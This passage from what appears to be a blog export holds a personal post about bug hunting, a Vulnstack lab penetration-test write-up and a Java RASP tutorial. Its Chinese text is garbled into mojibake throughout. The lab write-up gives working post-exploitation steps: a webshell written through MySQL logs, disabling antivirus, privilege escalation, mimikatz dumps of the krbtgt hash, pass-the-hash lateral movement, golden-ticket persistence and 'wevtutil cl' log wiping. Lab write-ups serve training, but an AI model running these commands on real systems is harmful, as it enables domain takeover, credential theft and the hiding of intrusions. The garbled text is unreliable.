æ³•ç»™äºˆç¼–å·ã€‚ã€‚ã€‚ã€‚ã€‚ å…­æœˆä¸­æ—¬ï¼Œçœ‹ç€è‡ªå·±ç©ºç©ºå¦‚ä¹Ÿçš„ä¸ªäººè£èª‰ï¼Œå¼±å°çš„æŒ–æ´èƒ½åŠ›ï¼Œæˆ‘æƒ³ç€æ”¹å˜ï¼Œæ­£å¥½é‚£æ—¶å…¬ä¼—å·çœ‹åˆ°ä¸€ä½å¸ˆå‚…æœ‰å¼€è¯¾ï¼Œsrcæ–¹é¢çš„ï¼Œä»·æ ¼åœ¨ä¸€åƒå¤šï¼Œæˆ‘å’¬å’¬ç‰™ï¼Œè¯¢é—®äº†äº›ç›¸å…³ä¿¡æ¯åï¼Œäº¤äº†é’±å¼€å§‹äº†srcæ–¹é¢çš„å­¦ä¹ ï¼Œç°åœ¨è¿˜æ˜¯æŒºæ„Ÿè°¢å½“æ—¶çš„æˆ‘æ•¢åšå‡ºè¿™æ ·çš„å†³å®šçš„ï¼Œé€šè¿‡ä»–å¼€çš„è¯¾æˆ‘å­¦åˆ°äº†åŸºç¡€çš„æŒ–æ´æŠ€å·§ï¼Œä¿¡æ¯æ”¶é›†ï¼Œä»¥åŠä¸€äº›æ–°çš„æ¼æ´æ€è·¯ç­‰ï¼Œåœ¨ä¸ƒæœˆä»½çš„æ—¶å€™ä¹Ÿæ˜¯æˆåŠŸåœ¨å¤šä¸ªå¹³å°æˆåŠŸæäº¤äº†æ¼æ´ï¼Œé€šè¿‡äº†å®¡æ ¸ æˆ‘å¹¶æ²¡æœ‰å¤šæŒ–ï¼Œåœ¨ä¸ƒæœˆæœ«çš„æ—¶å€™åˆå¼€å§‹äº†javaçš„é¡¹ç›®å®¡è®¡ï¼Œæƒ³å®¡å‡ºäº›cveæ¥ï¼Œæƒ³å‡ºæˆæœï¼Œæˆ‘çœ‹ç€ä¸€ä¸ªé¡¹ç›®ï¼Œgithubå‡ åƒstarï¼Œç°å®ç½‘ç«™ä¹Ÿæœ‰å‡ åƒï¼Œè¯¥é¡¹ç›®æ—§ç‰ˆæœ¬æˆ‘å®¡è®¡è¿‡ï¼Œäºæ˜¯æˆ‘æ‰“ç®—è¯•è¯•å®ƒçš„æœ€æ–°ç‰ˆæœ¬ã€‚å¾ˆå¹¸è¿ï¼Œå‡ºæ´äº†ï¼ŒæŒ–åˆ°çš„åŸºæœ¬éƒ½æ‹¿å»äº¤cveï¼Œå…«æœˆä»½ç»™æˆ‘å›äº†é‚®ä»¶ï¼Œéƒ½æˆåŠŸæ‹¿åˆ°äº†ç¼–å·ï¼Œå…¶ä¸­cvssæœ€é«˜è¯„åˆ†å¯è¾¾8.8ï¼Œæˆ‘å½“æ—¶ä¹Ÿå¾ˆæƒŠè®¶ã€æ¿€åŠ¨ ä¹æœˆåˆï¼Œæˆ‘æƒ³ç€æˆ‘ä¹Ÿåº”è¯¥å‡†å¤‡æŠ•å®ä¹ äº†å§ï¼Œå¼€å§‹äº†è‡ªå·±çš„å¤ä¹ ä¹‹è·¯ï¼Œè¿‡å»çš„æ¼æ´å¤ä¹ ä¸€éï¼Œjavaååºåˆ—åŒ–ä¹Ÿè¿‡ä¸€éï¼Œå¹¶ä¸”è‡ªå·±å†ç”»ä¸“é—¨çš„æµç¨‹å›¾æ¥åŠ æ·±è®°å¿†ï¼Œå¯¹äºä¸€äº›ç‰¹åˆ«çš„æ¯”å¦‚fastjsonã€jndiç­‰è¿›ä¸€æ­¥çš„å­¦äº†ç‚¹ç»•è¿‡ï¼Œå¯¹äºå†…å­˜é©¬è¿›è¡Œäº†è¿›ä¸€æ­¥çš„å­¦ä¹ ï¼Œå‘ç°å‡ ä¸ªæœˆå‰å›°æ‰°æˆ‘çš„çŸ¥è¯†ç‚¹è¿™ä¸ªæ—¶å€™éƒ½è¾ƒå¥½ç†è§£äº† åæœˆä»½ï¼Œå†™å®Œäº†ç®€å†ï¼Œå¼€å§‹æŠ•å®ä¹ ï¼Œæœ€å¼€å§‹æˆ‘æƒ³çš„æ˜¯å¯’å‡å»å®ä¹ ï¼Œæ‰€ä»¥æœ‰çš„å…¬å¸é‰´äºè¿™ç‚¹å°±è·Ÿæˆ‘è¯´åäºŒæœˆä»½å†è”ç³»ï¼Œåé¢æˆ‘ä¹Ÿå­¦èªæ˜äº†ï¼Œbossä¸Šè”ç³»äº†ä¸‹lmçš„hrï¼Œç»“æœå‡ å¤©éƒ½æ²¡ååº”ï¼Œä»¥ä¸ºäººå®¶å®ä¹ ç”Ÿå·²ç»æ”¶æ»¡äº†ï¼Œé‚æ”¾å¼ƒï¼Œæƒ³ç€åäºŒæœˆä»½å†æŠ•å§ï¼Œç»“æœæ²¡æƒ³åˆ°åé¢lmçš„hrè¦äº†æˆ‘çš„ç®€å†ï¼Œç„¶åç¬¬äºŒå¤©å°±çº¦æˆ‘ä¸‹åˆé¢è¯•ï¼Œå®³æ€•çš„æˆ‘æ¨åˆ°äº†ç¬¬ä¸‰å¤©ä¸‹åˆ é¢è¯•å‰ä¸¤ä¸ªé’Ÿå¤´ï¼Œå¤ä¹ ä¸ä¸‹å»äº†ï¼Œå¿ƒæ…Œæ„ä¹±ï¼Œåç«‹ä¸å®‰ï¼Œç„¶åå¼€å§‹é¢è¯•äº†ï¼Œè¿‡ç¨‹è¿˜æŒºé¡ºåˆ©ï¼ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ æˆåŠŸæ‹¿ä¸‹äº†å®ä¹ ï¼Œä»¥åä¹Ÿè¦å¼€å§‹æœ‰ç­å‘³äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ åæ–‡åº“åº“æ²‰æ·€ï¼Œæ²‰æ·€çš„æ—¶é—´æ˜¯çœŸçš„éš¾ç†¬ï¼Œå‡ºç»“æœçš„æ—¶å€™æ„Ÿè§‰å€¼äº†ï¼Œkeep going"},{"title":"Vulnstackçº¢æ—¥é¶åœº(1)","path":"/2025/10/12/Vulnstackçº¢æ—¥é¶åœº-1/","content":"Vmwareå¯¼å…¥ä¸»æœº æ”»å‡»æœºkali linux WebæœåŠ¡å™¨Windows7 åŸŸæ§Windows2008 åŸŸæˆå‘˜Windows2003 ç¯å¢ƒæ­å»ºç½‘ç»œé…ç½®win7ä½œä¸ºwebæœåŠ¡å™¨ï¼Œéœ€è¦å¤–éƒ¨èƒ½å¤Ÿè®¿é—®ï¼Œå› æ­¤ç½‘å¡éœ€è¦èµ°NATï¼ŒåŒæ ·æ”»å‡»æœºkaliä¹Ÿè¦èƒ½å¤Ÿè¢«å¤–éƒ¨(ä¸»è¦æ˜¯åå¼¹shell)è®¿é—®ä»¥åŠè®¿é—®win7ï¼Œå› æ­¤kaliä¹Ÿèµ°NATã€‚åŸŸæ§ã€åŸŸæˆå‘˜ä¸æ¥è§¦å¤–ç½‘ï¼Œå› æ­¤éœ€è¦è®¾ç½®å…¶ç½‘å¡ä¸ºä»…ä¸»æœºæ¨¡å¼(ç½‘æ®µéœ€ä¸NATçš„ä¸åŒ)ï¼ŒåŒæ—¶win7éœ€è¦èƒ½å¤Ÿè®¿é—®å†…ç½‘ï¼Œå› æ­¤win7ä¹Ÿå¾—é…ç½®ä¸€å¼ ä»…ä¸»æœºæ¨¡å¼çš„ç½‘å¡ é¦–å…ˆé…ç½®ä¸€ä¸‹ç½‘ç»œç¼–è¾‘å™¨ï¼Œä¸‰å°ä¸»æœºä¸€å¼€å§‹éƒ½è¢«åˆ†é…äº†å›ºå®šçš„ipç½‘æ®µ192.168.52.0/24äº†ï¼Œå› æ­¤éœ€è¦æ·»åŠ ä¸€å¼ ä»…ä¸»æœºæ¨¡å¼ã€å­ç½‘åœ°å€ä¸º192.168.52.0çš„ç½‘å¡ æ¥ä¸‹æ¥æ˜¯ä¸ºå››å°ä¸»æœºé…ç½®ç½‘å¡ï¼š Win7ä¸¤å¼ ï¼Œä¸€å¼ å†…ç½‘ä¸€å¼ å¤–éƒ¨è®¿é—®ï¼š è¿™é‡Œæœ‰æœ¬äººè¸©è¿‡çš„å‘ï¼Œå¿…é¡»æ˜¯ç½‘ç»œé€‚é…å™¨1æ˜¯ä¸»æœºæ¨¡å¼ï¼Œé€‚é…å™¨2æ˜¯NATã€‚å»ºè®®æŠŠé¢„è£…çš„NATæ”¹ä¸ºè‡ªå®šä¹‰çš„ï¼Œå†æ·»åŠ ä¸€å¼ æ–°çš„è®¾ç½®ä¸ºNATï¼Œæ€»ä¹‹å°±æ˜¯å¾ˆç„å­¦ã€‚ã€‚ã€‚æ›´æ”¹è®¾ç½®çš„æ—¶å€™éƒ½å¤„äºå…³æœºçŠ¶æ€ï¼Œç„¶åé‡å¼€æœº åŸŸæ§(Windows2008)ä¸€å¼ ï¼Œç”¨äºå†…ç½‘ï¼š åŸŸæˆå‘˜(Windows2003)ä¸€å¼ ï¼Œç”¨äºå†…ç½‘ï¼š win7ã€win8å†æŠŠæ‰€æœ‰é˜²ç«å¢™éƒ½å…³ä¸€ä¸‹ æœ€ç»ˆçš„ç»“æœï¼š win7èƒ½å¤Ÿpingé€šå¤–éƒ¨ä»¥åŠæ”»å‡»æœºkaliä»¥åŠå†…ç½‘å…¶ä»–2å°ä¸»æœº Windows2008èƒ½å¤Ÿpingé€šå†…ç½‘å…¶ä»–ä¸¤å°ä¸»æœºä½†æ˜¯æ— æ³•pingé€šå¤–éƒ¨ä»¥åŠkali Windows2003åŒä¸Š kalièƒ½å¤Ÿä¸å¤–ç•Œè®¿é—®ï¼Œèƒ½å¤Ÿpingé€šwin7çš„NATçš„ipï¼Œæ— æ³•Pingé€šæ‰€æœ‰52ç½‘æ®µå†…ç½‘ip å„ä¸»æœºçš„ipkali : 192.168.227.137(NAT) 192.168.52.129win7 : 192.168.227.139(NAT) 192.168.52.143win08 : 192.168.52.138win03 : 192.168.52.141 å¯åŠ¨webæœåŠ¡win7çš„Cç›˜ä¸‹æ‰¾åˆ°phpstudyå¹¶å¯åŠ¨webæœåŠ¡ï¼Œèƒ½å¤Ÿæ¯å¤–éƒ¨è®¿é—®ï¼š å½“æ—¶æˆ‘ç›´æ¥å¯åŠ¨æ˜¯ä¸æˆåŠŸçš„ï¼Œä¼šä¸€ç›´æŠ¥é”™ï¼Œåé¢ç½‘ä¸Šæ‰¾è§£å†³æ–¹æ¡ˆçš„æ—¶å€™å‘Šè¯‰æˆ‘éœ€è¦å‡çº§win7è™šæ‹Ÿæœºï¼Œå½“æˆ‘å°†å…¶å‡çº§åˆ°16.xï¼Œä¹Ÿå°±æ˜¯æˆ‘è‡ªå·±VMwareçš„ç‰ˆæœ¬çš„æ—¶å€™é‡æ–°å¯åŠ¨è™šæ‹Ÿæœºï¼Œå°±å¯ä»¥æˆåŠŸå¯åŠ¨webæœåŠ¡äº† å¤–ç‚¹getshellæ¢é’ˆçš„é¡µé¢ä¸‹ï¼ŒMySQLå¼±å£ä»¤å­˜åœ¨rootrootï¼Œä½†æ˜¯ä¼¼ä¹æ˜¯å†…ç½‘å­˜åœ¨ï¼Œå¤–éƒ¨æ— æ³•è¿æ¥ä¸Š ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°æœ‰phpMyAdminåå°ä»¥åŠphpinfo åœ¨è¿™é‡Œæœ‰sqlæ‰§è¡Œçš„åœ°æ–¹ï¼Œè‡ªç„¶å°±æƒ³åˆ°äº†é€šè¿‡sqlæ¥getshellçš„æ“ä½œ å¹¶ä¸”è¿˜æ˜¯åœ¨windowsç³»ç»Ÿä¸‹ï¼Œæ‰€ä»¥ç”¨å†™æ—¥å¿—çš„æ–¹å¼æ¥è¿›è¡Œgetshell å…·ä½“æ“ä½œå¯æŸ¥çœ‹ï¼šhttps://www.sqlsec.com/2020/11/mysql.html#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell ä»è™šæ‹Ÿæœºä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æˆåŠŸå†™è¿›äº† ç„¶åå°±å¯ä»¥ç”¨èšå‰‘æˆåŠŸè¿ä¸Šäº† åæ¸—é€é˜¶æ®µä¸Šçº¿csåœ¨kaliä¸­å¯åŠ¨teamserverï¼Œé…ç½®å¥½ipå’Œå¯†ç ï¼ˆipæ˜¯kaliæœ¬èº«çš„ip ç„¶åèµ·ä¸€ä¸ªbeacon httpçš„ç›‘å¬å™¨ ç”Ÿæˆwindowsç«¯åé—¨æ–‡ä»¶ ç„¶åå†å°†è¯¥exeé€šè¿‡èšå‰‘ä¸Šä¼ åˆ°win7æœºå­ä¸Šï¼Œæ‰§è¡Œcs.exeæˆåŠŸä¸Šçº¿ ä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œæŠŠä¼šè¯æ´¾ç”Ÿåˆ°msfï¼Œå…ˆåœ¨msfé…ç½®å¥½æ¨¡å—å’Œpayloadï¼Œlhostä»¥åŠç«¯å£ç­‰ä¿¡æ¯ï¼Œå¼€ä¸ªåå‘è¿æ¥ åœ¨CSåˆ›å»ºä¸€ä¸ªæ–°çš„ç›‘å¬å™¨ï¼Œpayloadé€‰foreign httpï¼Œhostå¡«msfçš„æœåŠ¡ipï¼Œç«¯å£å¡«msfçš„ç›‘å¬ç«¯å£ åœ¨csä¼šè¯ä¸­é€‰ä¸­æ–°å»ºä¼šè¯ æ‹¿åˆ°meterpreter æ£€æŸ¥æ˜¯å¦ä¸ºè™šæ‹Ÿæœºï¼Œä¸€èˆ¬æ˜¯ç”¨äºæ£€æµ‹èœœç½çš„ run post/windows/gather/checkvm éšæ‰‹å…³æ€è½¯(é¶åœºæ˜¯æ²¡æœ‰çš„ï¼Œä½†æ˜¯å®æˆ˜ä¸­æ‹¿åˆ°shellç¬¬ä¸€ä»¶äº‹å°±æ˜¯å…³æ€è½¯) run post/windows/manage/killav æ‰«äº†ä¸‹æœºå­ï¼Œå‘ç°è¿˜æ˜¯æœ‰éå¸¸å¤šèƒ½åˆ©ç”¨çš„æ¼æ´çš„ ç›®å‰æ˜¯ç®¡ç†å‘˜æƒé™ ä½†æˆ‘ä»¬è¿˜å¯ä»¥ææƒåˆ°systemçº§åˆ«çš„æƒé™ï¼Œåœ¨meterpreterä¸­é€šè¿‡getsystemå‘½ä»¤è¿›è¡Œææƒ åœ¨CSä½¿ç”¨logonpasswordsè·å–ç”¨æˆ·åå¯†ç ï¼Œå¯åœ¨CSä¸­å¼€å¯RDPåè¿œç¨‹æ¡Œé¢è¿æ¥ï¼ˆäº²æ‰‹æµ‹è¯•åè¡¨ç¤ºè¶…å¡ å†…ç½‘ä¿¡æ¯æ”¶é›†ipconfig /all #æŸ¥è¯¢å½“å‰ç½‘ç»œæƒ…å†µ(DNSï¼ŒåŸŸç­‰)systeminfo #æŸ¥ç³»ç»Ÿä¿¡æ¯net view # æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºånet view /domain # æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸnet user # æŸ¥çœ‹æœ¬æœºç”¨æˆ·ånet user /domain # æŸ¥çœ‹åŸŸç”¨æˆ·net config Workstation # æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸnet user # æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨net localgroup administrators # æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰net user ç”¨æˆ·å /domain # è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯net group /domain # æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„net group ç»„å /domain # æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„net group domain admins /domain # æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—net group domain computers /domain # æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºånet group domain controllers /domain # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰ å…ˆæ‰§è¡ŒwhoamiæŸ¥çœ‹èº«ä»½ï¼Œå‘ç°æ˜¯godåŸŸä¸‹çš„administratoræƒé™ï¼Œä¹Ÿæ¥ä¸€æ‰‹ææƒåˆ°systemï¼Œè¦ä¸ç„¶åé¢æœ‰ç‚¹çš„å‘½ä»¤æƒé™ä¸å¤ªå¤Ÿ æ›´å¥½çš„å»ºè®®æ˜¯é€šè¿‡cså†…ç½®çš„æ¨¡å—è¿›è¡Œææƒåˆ°system æœ€åä¼šç”Ÿæˆä¸€ä¸ªæ–°listenerä¼šè¯ï¼Œuseræ˜¯systemçº§åˆ«çš„ æ‰§è¡Œnet config workstationï¼Œå‘ç°å­˜åœ¨åŸŸgod å¯èƒ½å­˜åœ¨å¤šä¸ªåŸŸï¼Œå› æ­¤ï¼Œæ¥ä¸‹æ¥æ‰§è¡Œnet view /domainï¼Œå‘ç°åªæœ‰ä¸€ä¸ªåŸŸGOD net viewæŸ¥çœ‹ä¸€ä¸‹åŸŸå†…ä¸€å…±æœ‰ä¸‰å°ä¸»æœº æŸ¥çœ‹åŸŸä¸‹çš„åˆ†ç»„ ç›´æ¥net group domain controllers /domainæŸ¥çœ‹åŸŸç®¡ç†å‘˜ è‡³æ­¤åŸŸå†…å…³é”®ä¿¡æ¯æ‰€æ”¶é›†çš„å·®ä¸å¤šäº†ï¼Œæ¢³ç†ä¸€ä¸‹ å­˜åœ¨ä¸€ä¸ªåŸŸGODï¼ŒGODåŸŸä¸‹æœ‰ä¸‰å°ä¸»æœºï¼ŒåŸŸæ§æ˜¯OWAä¸»æœºï¼Œå³192.168.52.138ï¼Œwin7ä¸»æœºå†…ç½‘ipä¸º192.168.52.129ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰«æå†…ç½‘ä¸»æœºäº† msfæ‹¿ä¸‹åŸŸæ§å…ˆè¿›è¡Œç«¯å£æ‰«æï¼Œè¿™é‡Œä½¿ç”¨CSçš„portscanæˆ–è€…msfçš„auxiliary/scanner/portscan/tcp æ¨¡å— å‘ç°OWAä¸»æœºå¼€æ”¾äº†445ã€636ã€593ç­‰ç«¯å£ å…ˆç”¨nmapç²—ç•¥æ‰«ä¸€ä¸‹åŸŸæ§ä¸»æœºå¼€æ”¾ç«¯å£çš„å¯èƒ½å­˜åœ¨æ¼æ´ nmap --script=vuln -p636,593,464,389,135,139,88,80,53,445 192.168.52.138 å“ˆå¸Œä¼ é€’æ”»å‡»å‰é¢ç«¯å£æ‰«æè¿‡çš„ç›®æ ‡ä¸»æœºéƒ½ä¼šåœ¨Targetsä¸­æ˜¾ç¤ºï¼š æˆ‘ä»¬å¯ä»¥åˆ›å»ºSMBç›‘å¬éš§é“ï¼Œé¦–å…ˆæˆ‘ä»¬æ–°å¢ä¸€ä¸ªSMBç›‘å¬å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨beaconæ‰§è¡Œlogonpasswordsæ¥è·å–æ˜æ–‡å¯†ç ä»¥åŠå“ˆå¸Œå‡­æ® ç„¶ååœ¨Targetsä¸­é€‰ä¸­ç›®æ ‡ä¸»æœºå³é”®ï¼Œè¿›è¡ŒJumpï¼Œæ–¹å¼é€‰psexecæ”»å‡» ç›‘å¬å™¨é€‰æ‹©æˆ‘ä»¬åˆšåˆšæ–°å»ºçš„SMB è¿™é‡Œæˆ‘ä»¬é€‰æ‹©systemæƒé™çš„sessionè¿›è¡Œå“ˆå¸Œä¼ é€’ï¼Œå…¶ä»–çš„å¯èƒ½æƒé™ä¸å¤Ÿ æˆåŠŸæ¨ªç§»åˆ°åŸŸæ§ä¸»æœºä¸Š æ¥ç€æˆ‘ä»¬è¦åšçš„æ˜¯å…³é—­åŸŸæ§çš„é˜²ç«å¢™ï¼ˆè¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ é»„é‡‘ç¥¨æ®ç»´æŒæƒé™ åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰æ˜¯ä¸€ç§æƒé™ç»´æŒæŠ€æœ¯ï¼Œå…è®¸æ”»å‡»è€…åœ¨è·å–åŸŸæ§æƒé™åï¼Œä¼ªé€ æœ‰æ•ˆçš„Kerberosç¥¨æ®æˆäºˆç¥¨æ®ï¼ˆTGTï¼‰ï¼Œä»è€Œé•¿æœŸã€éšè”½åœ°é‡æ–°è·å¾—åŸŸå†…è®¿é—®æƒé™ è¦ç†è§£é»„é‡‘ç¥¨æ®ï¼Œéœ€å…ˆäº†è§£Kerberosè®¤è¯æµç¨‹ã€‚å½“ç”¨æˆ·ç™»å½•åŸŸæ—¶ï¼ŒåŸŸæ§åˆ¶å™¨ï¼ˆä½œä¸ºå¯†é’¥åˆ†å‘ä¸­å¿ƒKDCï¼‰çš„èº«ä»½è®¤è¯æœåŠ¡ï¼ˆASï¼‰ä¼šéªŒè¯ç”¨æˆ·å‡­è¯ã€‚è‹¥æˆåŠŸï¼ŒASä¼šå‘ç”¨æˆ·ç­¾å‘ä¸€ä¸ªTGTã€‚è¯¥TGTç”±KDCçš„ä¸€ä¸ªç‰¹æ®Šè´¦æˆ·â€”â€”krbtgtè´¦æˆ·çš„NTLMå“ˆå¸Œè¿›è¡ŒåŠ å¯†ç­¾å ç”¨æˆ·åç»­ç”³è¯·è®¿é—®å…¶ä»–æœåŠ¡çš„ç¥¨æ®ï¼ˆService Ticketï¼‰æ—¶ï¼Œåªéœ€å‡ºç¤ºæ­¤TGTï¼Œè€Œæ— éœ€å†æ¬¡è¾“å…¥å¯†ç ã€‚ é»„é‡‘ç¥¨æ®æ”»å‡»çš„æ ¸å¿ƒåœ¨äºï¼Œä¸€æ—¦æ”»å‡»è€…è·å–äº†krbtgtè´¦æˆ·çš„å¯†ç å“ˆå¸Œï¼ˆNTLM Hashï¼‰ï¼Œå°±å¯ä»¥ç¦»çº¿ä¼ªé€ ä»»æ„ç”¨æˆ·ï¼ˆåŒ…æ‹¬åŸŸç®¡ç†å‘˜ï¼‰çš„TGTã€‚å› ä¸ºKDCåœ¨éªŒè¯TGTæ—¶ï¼Œä½¿ç”¨å…¶æŒæœ‰çš„krbtgtå“ˆå¸Œè¿›è¡Œè§£å¯†éªŒè¯ï¼Œåªè¦æ”»å‡»è€…ä½¿ç”¨æ­£ç¡®çš„krbtgtå“ˆå¸ŒåŠ å¯†ä¼ªé€ çš„TGTï¼Œè¯¥ç¥¨æ®å°±ä¼šè¢«KDCè®¤ä¸ºæ˜¯åˆæ³•çš„ã€‚æ›´å…³é”®çš„æ˜¯ï¼Œå³ä½¿åŸŸç®¡ç†å‘˜åæœŸæ›´æ”¹äº†å¯†ç ï¼Œåªè¦krbtgtè´¦æˆ·çš„å“ˆå¸Œæœªå˜ï¼Œä¹‹å‰ä¼ªé€ çš„é»„é‡‘ç¥¨æ®ä¾ç„¶æœ‰æ•ˆï¼Œè¿™ä½¿å¾—å®ƒæˆä¸ºä¸€ç§éå¸¸å±é™©çš„æŒä¹…åŒ–åé—¨ æˆåŠŸåˆ¶ä½œé»„é‡‘ç¥¨æ®éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªå…³é”®æ¡ä»¶ å·²è·å¾—åŸŸç®¡ç†å‘˜çº§åˆ«æƒé™ï¼šè¿™æ˜¯å‰æä¸­çš„å‰æï¼Œå› ä¸ºä½ éœ€è¦å€Ÿæ­¤å»è·å–ä¸‹ä¸€æ­¥çš„å…³é”®ä¿¡æ¯ã€‚ è·å–åŸŸçš„æ ‡è¯†ä¿¡æ¯ï¼š åŸŸåï¼šç›®æ ‡Active DirectoryåŸŸçš„å®Œæ•´åŸŸåã€‚ åŸŸSIDï¼šåŸŸçš„å®‰å…¨æ ‡è¯†ç¬¦ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤å¦‚ whoami /useræˆ– wmic useraccount get name,sidè·å–ï¼Œä½¿ç”¨æ—¶éœ€è¦å»æ‰æœ«å°¾è¡¨ç¤ºç”¨æˆ·çš„RIDéƒ¨åˆ†ã€‚ è·å–krbtgtè´¦æˆ·çš„NTLMå“ˆå¸Œï¼šè¿™æ˜¯æœ€æ ¸å¿ƒçš„è¦ç´ ã€‚åœ¨å·²æ§åˆ¶åŸŸæ§åˆ¶å™¨çš„æƒ…å†µä¸‹ï¼Œå¸¸ç”¨å·¥å…·å’ŒæŠ€æœ¯è·å–ï¼š ä½¿ç”¨Mimikatzçš„DCSyncåŠŸèƒ½ï¼šæ­¤åŠŸèƒ½å¯æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼Œå‘çœŸå®çš„åŸŸæ§åˆ¶å™¨è¯·æ±‚æ•°æ®åŒæ­¥ï¼Œä»è€Œè·å–æŒ‡å®šè´¦æˆ·çš„å“ˆå¸Œï¼Œæ— éœ€ç™»å½•åŸŸæ§åˆ¶å™¨ mimikatz # lsadump::dcsync /domain:åŸŸå /user:krbtgt åœ¨åŸŸæ§åˆ¶å™¨ä¸Šç›´æ¥è½¬å‚¨ï¼šè‹¥å·²ç›´æ¥åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»£ç ï¼Œå¯ä½¿ç”¨Mimikatzä»LSASSè¿›ç¨‹è½¬å‚¨å“ˆå¸Œã€‚ mimikatz # privilege::debugmimikatz # lsadump::lsa /inject /name:krbtgt ä¸‹é¢æ˜¯åˆ©ç”¨csæ¥åˆ›å»ºé»„é‡‘ç¥¨æ® é¦–å…ˆæ‹¿åˆ°krbtgtè´¦æˆ·çš„å“ˆå¸Œ å†é€šè¿‡logonpasswordsæ‹¿åˆ°æ˜æ–‡å¯†ç  ç„¶ååˆ©ç”¨csä¸­å†…ç½®çš„é»„é‡‘ç¥¨æ®æ¨¡å—æ¥è¿›è¡Œåˆ›å»ºï¼Œuseråå¯ä»¥è‡ªå·±åˆ› è¿™æ ·å­æˆ‘ä»¬å°±æˆåŠŸåˆ›å»ºäº†å±äºæˆ‘ä»¬è‡ªå·±çš„é»„é‡‘ç¥¨æ®äº† ç—•è¿¹æ¸…ç†shell wevtutil cl security //æ¸…ç†å®‰å…¨æ—¥å¿—shell wevtutil cl system //æ¸…ç†ç³»ç»Ÿæ—¥å¿—shell wevtutil cl application //æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—shell wevtutil cl windows powershell //æ¸…é™¤power shellæ—¥å¿—shell wevtutil cl Setup //æ¸…é™¤ï¼ˆclï¼‰äº‹ä»¶æ—¥å¿—ä¸­çš„ Setup äº‹ä»¶ã€‚ msf clearev #æ¸…é™¤äº‹ä»¶æ—¥å¿— å‚è€ƒVulnstackçº¢æ—¥é¶åœº(1)ğŸ’• çº¢æ—¥é¶åœº-1è¯¦ç»†è§£æï¼ˆé€‚åˆå°ç™½ç‰ˆï¼‰","categories":["Write-Up"]},{"title":"java-agentä¸RASP","path":"/2025/10/10/java-agentä¸RASP/","content":"å‚è€ƒJava ååºåˆ—åŒ–ç»•è¿‡ RASP å‰è¨€è·Ÿjava agentæœ‰å…³çš„çŸ¥è¯†ç‚¹å¯è§ï¼šhttps://cina666.github.io/2025/05/21/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent/ï¼Œhttps://blog.potatowo.top/2025/04/25/JavaAgent%E4%B8%8ERASP RASPå®ç°premainå‰é¢æˆ‘ä»¬å·²ç»å­¦åˆ°äº†å¦‚ä½•åˆ©ç”¨java-agentæ¥è¿›è¡Œæ”»å‡»ï¼Œé‚£ä¹ˆåŒæ ·æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„hookæ‰execæ–¹æ³•çš„rasp è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯premainæ–¹æ³• å…ˆåˆ›å»ºä¸€ä¸ªrasp_testç±»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š package Test3;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.Instrumentation;import java.security.ProtectionDomain;public class rasp_test implements ClassFileTransformer public static void premain(String args, Instrumentation instrumentation) throws Exception instrumentation.addTransformer(new rasp_test(),true); instrumentation.retransformClasses(Runtime.class); @Override public byte[] transform(ClassLoader loader, String className, Class? classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) // System.out.println(className); if (className.equals(java/lang/Runtime)) try // System.out.println(12121212); return modifyExecMethod(classfileBuffer); catch (Exception e) e.printStackTrace(); return null; private byte[] modifyExecMethod(byte[] classfileBuffer) throws Exception ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(Class.forName(java.lang.Runtime))); CtClass ctClass = classPool.get(Runtime.class.getName()); CtMethod[] ctMethods = ctClass.getDeclaredMethods(exec); for (CtMethod ctMethod:ctMethods) ctMethod.setBody( throw new SecurityException(\\æ³¥åœ¨åšä»€ä¹ˆï¼\\); ); byte[] bytecode = ctClass.toBytecode(); ctClass.detach(); return bytecode; MANIFEST.MFå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š Manifest-Version: 1.0Premain-Class: Test3.rasp_testCan-Redefine-Classes: trueCan-Retransform-Classes: trueCan-Set-Native-Method-Prefix: true pom.xmlä¸­çš„mavené…ç½®è¦ä¸ºmaven-assembly-pluginï¼Œè¿™æ 